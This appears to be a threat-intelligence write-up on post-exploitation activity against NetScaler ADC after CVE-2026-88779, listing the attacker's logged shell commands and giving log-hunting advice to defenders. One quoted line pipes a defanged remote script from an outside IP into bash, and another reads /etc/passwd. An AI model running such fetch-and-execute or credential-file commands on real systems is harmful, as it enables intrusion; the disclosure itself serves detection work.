Post-exploitation activity on NetScaler ADC (CVE-2026-88779)

Following exploitation, we observed the NetScaler packet-processing web process nsppe spawning an interactive shell. Within two minutes the actor ran a burst of discovery commands and then downloaded a second stage with curl.

/bin/sh -c whoami
/bin/sh -c id
/bin/sh -c uname -a
/bin/sh -c cat /etc/passwd
/bin/sh -c curl -s hxxp://45[.]61[.]139[.]12/x.sh | bash

The second stage reached out to update-check[.]net. We recommend hunting appliance shell logs (/var/log/bash.log, /var/log/notice.log) for commands executed by nobody as children of nsppe.

No file hashes were recovered.
